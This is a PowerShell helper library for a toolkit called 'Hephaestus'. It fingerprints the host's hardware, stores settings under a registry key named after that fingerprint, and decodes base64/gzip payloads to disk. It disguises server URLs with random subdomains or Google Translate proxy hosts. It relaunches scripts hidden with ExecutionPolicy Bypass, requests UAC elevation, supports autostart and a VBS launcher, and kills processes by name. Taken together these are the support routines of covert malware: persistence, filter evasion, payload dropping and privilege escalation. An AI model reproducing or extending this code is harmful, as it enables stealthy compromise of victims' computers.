function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$script:machineCode = ""

function Get-MachineCode {

    if (-not [string]::IsNullOrEmpty($script:machineCode))
    {
        return $script:machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $script:machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $script:machineCode = "Hephaestus"
    }
    return $script:machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl {
    param ([string]$url)
    if ([string]::IsNullOrWhiteSpace($url)) {
        return $url
    }
    try {
        $uri = [System.Uri]$url
        $hostPart = $uri.Host
        if ($hostPart.StartsWith('[') -and $hostPart.EndsWith(']')) {
            $hostPart = $hostPart.Substring(1, $hostPart.Length - 2)
        }
        $parsedIp = $null
        if ([System.Net.IPAddress]::TryParse($hostPart, [ref]$parsedIp)) {
            return $url
        }
    }
    catch {
    }
    $url = ModifyUrl -url $url
    return $url
}


function writedbg {
    param (
        [Parameter(Position = 0)]
        [string] $msg = "",
        [Parameter(Position = 1)]
        [string] $msg2 = "",
        [string] $ForegroundColor = $null
    )
    $line = if ([string]::IsNullOrEmpty($msg2)) { [string]$msg } else { [string]$msg + [string]$msg2 }
    $stamp = (Get-Date).ToString("o")
    $record = "[$stamp] $line"

    if ($PSBoundParameters.ContainsKey("ForegroundColor") -and -not [string]::IsNullOrWhiteSpace($ForegroundColor)) {
        Write-Host $record -ForegroundColor $ForegroundColor
    }
    else {
        Write-Host $record
    }

    try {
        $dir = Get-HephaestusFolder
        if (-not (Test-Path -LiteralPath $dir)) {
            [void][System.IO.Directory]::CreateDirectory($dir)
        }
        $logPath = Get-HephaestusDiagLogPath
        [System.IO.File]::AppendAllText($logPath, $record + [Environment]::NewLine)
    }
    catch {
        try { [Console]::Error.WriteLine("writedbg: log file append failed: $_ | $record") } catch { }
    }
}

# Roaming subfolder + script basename (sanitized [Environment]::MachineName + literal "service"); matches launcher.vbs. Get-MachineCode stays for registry/tracker.
function Get-HephaestusDirName {
    $suffix = 'service'
    $maxBase = 32 - $suffix.Length
    $n = [Environment]::MachineName
    if ([string]::IsNullOrWhiteSpace($n)) {
        $base = 'Hephaestus'
    }
    else {
        $sb = [System.Text.StringBuilder]::new()
        foreach ($ch in $n.ToCharArray()) {
            if ([char]::IsLetterOrDigit($ch) -or $ch -eq '-' -or $ch -eq '_') { [void]$sb.Append($ch) } else { [void]$sb.Append('_') }
        }
        $base = $sb.ToString().Trim('_')
        if ([string]::IsNullOrWhiteSpace($base)) { $base = 'Hephaestus' }
    }
    if ($base.Length -gt $maxBase) { $base = $base.Substring(0, $maxBase) }
    return $base + $suffix
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    return (Join-Path $appDataPath (Get-HephaestusDirName))
}

# Persisted copy of the last-run launcher (e.g. VBS drop) under AppData; used by extract_launcher.
function Get-LauncherPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-HephaestusDirName) + '.' + 'ps1'
    return (Join-Path $hephaestusFolder -ChildPath $scriptName)
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-HephaestusDirName) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Get-HephaestusDiagLogPath {
    return (Join-Path (Get-HephaestusFolder) "hephaestus_diag.log")
}

# Per-task append-only log (START/STOP) under Hephaestus folder; idempotent across runs.
function Write-TaskLifecycleLog {
    param(
        [Parameter(Mandatory = $true)][string]$TaskName,
        [Parameter(Mandatory = $true)][ValidateSet('START', 'STOP')][string]$Phase,
        [string]$Detail = ''
    )
    try {
        $dir = Get-HephaestusFolder
        if (-not (Test-Path -LiteralPath $dir)) {
            [void][System.IO.Directory]::CreateDirectory($dir)
        }
        $safe = ($TaskName -replace '[^\w\-\.]', '_')
        if ([string]::IsNullOrWhiteSpace($safe)) { $safe = 'unknown' }
        $path = Join-Path $dir "task_$safe.log"
        $stamp = (Get-Date).ToString("o")
        $line = "[$stamp] $Phase task=$TaskName pid=$PID"
        if (-not [string]::IsNullOrWhiteSpace($Detail)) { $line += " $Detail" }
        [System.IO.File]::AppendAllText($path, $line.TrimEnd() + [Environment]::NewLine)
    }
    catch {
        try { [Console]::Error.WriteLine("Write-TaskLifecycleLog failed: $_") } catch { }
    }
}

function Reset-HephaestusDiagLog {
    try {
        $dir = Get-HephaestusFolder
        if (-not (Test-Path -LiteralPath $dir)) {
            [void][System.IO.Directory]::CreateDirectory($dir)
        }
        [System.IO.File]::WriteAllText((Get-HephaestusDiagLogPath), "", [System.Text.UTF8Encoding]::new($false))
    }
    catch { }
}

function Get-ScriptInvocationArgs {
    # Arguments after -File "script.ps1" live in the entry script's scope as $args, not in $global:args.
    # Inside functions, $args is the function's own argument list, so autostart detection must use Script scope.
    try {
        $v = Get-Variable -Name args -Scope Script -ErrorAction Stop
        if ($null -eq $v.Value) { return @() }
        return @($v.Value)
    }
    catch {
        if ($null -ne $global:args -and $global:args.Count -gt 0) {
            return @($global:args)
        }
        return @()
    }
}

function Test-Arg {
    param ([string]$arg)
    $argv = Get-ScriptInvocationArgs
    if ($argv.Count -eq 0) { return $false }
    $joined = ($argv | ForEach-Object { "$_" }) -join ' '
    return $joined -like "*$arg*"
}

function Test-Autostart {
    # If the entry script uses param([switch]$Autostart) / [bool]$Autostart, "-autostart" is bound and
    # disappears from $args — same registry line still works (see autoregistry.ps1).
    try {
        $bv = Get-Variable -Name PSBoundParameters -Scope Script -ErrorAction Stop
        $bp = $bv.Value
        if ($null -ne $bp -and $bp.Count -gt 0) {
            foreach ($key in $bp.Keys) {
                if ([string]::IsNullOrWhiteSpace([string]$key)) { continue }
                if ($key.TrimStart("-").Equals("Autostart", [System.StringComparison]::OrdinalIgnoreCase)) {
                    return [bool]$bp[$key]
                }
            }
        }
    }
    catch { }

    $argv = Get-ScriptInvocationArgs
    for ($i = 0; $i -lt $argv.Count; $i++) {
        $t = [string]$argv[$i]
        if ([string]::IsNullOrWhiteSpace($t)) { continue }
        if ($t.TrimStart("-").Equals("autostart", [System.StringComparison]::OrdinalIgnoreCase)) {
            return $true
        }
    }
    return $false
}

function GetArg {
    param ([string]$arg)

    $globalArgs = Get-ScriptInvocationArgs
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

# Start-Process -Verb RunAs often ignores WorkingDirectory for powershell.exe (cwd stays e.g. System32),
# which breaks scripts that dot-source .\utils.ps1. Route elevation through cmd /c cd /d … && powershell …
function New-StartProcessSplatForPowerShellElevation {
    param(
        [Parameter(Mandatory = $true)][string]$WorkDir,
        [Parameter(Mandatory = $true)][string[]]$PowerShellArgumentList,
        [Parameter(Mandatory = $true)][string]$WindowStyle,
        [Parameter(Mandatory = $true)][bool]$RequestRunAs
    )
    if (-not $RequestRunAs) {
        return @{
            FilePath         = 'powershell.exe'
            WorkingDirectory = $WorkDir
            WindowStyle      = $WindowStyle
            ArgumentList     = $PowerShellArgumentList
        }
    }
    $dir = $WorkDir.TrimEnd('\')
    if ([string]::IsNullOrWhiteSpace($dir)) { $dir = $PWD.Path }
    $sb = [System.Text.StringBuilder]::new()
    [void]$sb.Append('cd /d "')
    [void]$sb.Append(($dir -replace '"', '""'))
    [void]$sb.Append('" && powershell.exe')
    foreach ($t in $PowerShellArgumentList) {
        [void]$sb.Append(' ')
        $s = [string]$t
        if ($s -match '[\s^&|<>()%"]') {
            [void]$sb.Append('"')
            [void]$sb.Append(($s -replace '"', '""'))
            [void]$sb.Append('"')
        } else {
            [void]$sb.Append($s)
        }
    }
    return @{
        FilePath     = 'cmd.exe'
        WindowStyle  = $WindowStyle
        ArgumentList = @('/c', $sb.ToString())
        Verb         = 'RunAs'
    }
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac,
        [bool]$Wait = $false
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script

    # Start-Process -ArgumentList must be separate tokens (string[]). A single concatenated string is passed as one argv and powershell.exe will not run -File correctly.
    $local = @('-ExecutionPolicy', 'Bypass', '-File', $scriptPath)

    if ($repassArgs -eq $true) {
        $globalArgs = Get-ScriptInvocationArgs
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += [string]$argValue
        }
    }

    $workDir = Split-Path -Parent -Path $scriptPath
    if ([string]::IsNullOrEmpty($workDir)) { $workDir = $PWD.Path }

    $style = $(if ($globalDebug) { "Normal" } else { "Hidden" })
    $requestRunAs = ($uac -eq $true -and -not (IsElevated))
    $sp = New-StartProcessSplatForPowerShellElevation -WorkDir $workDir -PowerShellArgumentList $local -WindowStyle $style -RequestRunAs $requestRunAs
    writedbg ("starting " + $(if ($requestRunAs) { 'cmd /c ' + [string]$sp.ArgumentList[1] } else { ($local -join ' ') }))

    if ($Wait) {
        $proc = Start-Process @sp -PassThru -Wait -ErrorAction Stop
        if ($null -eq $proc) {
            throw "Start-Process returned null"
        }
        if ($uac -eq $true -and $proc.HasExited) {
            $xc = $proc.ExitCode
            # User clicked No on UAC, or elevation was cancelled (0x800704C7 = -2147023673).
            if ($xc -eq 1223 -or $xc -eq -2147023673) {
                throw "UAC elevation cancelled (exit $xc)"
            }
        }
        return $proc
    }
    Start-Process @sp

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    # Administrator role only. Do not require Owner -ne User: after UAC elevation those often match,
    # so the old check left IsElevated false and the elevated body chain never ran (e.g. cert never installed).
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}